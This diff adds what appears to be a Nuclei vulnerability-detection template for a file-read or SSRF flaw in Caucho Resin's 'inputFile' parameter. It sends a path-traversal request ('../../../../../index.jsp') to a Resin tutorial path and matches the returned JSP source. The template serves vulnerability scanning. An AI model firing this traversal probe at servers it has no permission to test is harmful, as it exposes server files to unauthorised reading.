@@ -1,0 +1,21 @@
+id: poc-yaml-resin-inputfile-fileread-or-ssrf
+info:
+  name: Resin Inputfile Fileread Or SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+  description: |
+    Potential file read or SSRF vulnerability in Resin through a misconfigured inputFile parameter.
+http:
+  - method: GET
+    path:
+      - "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"
+        part: body
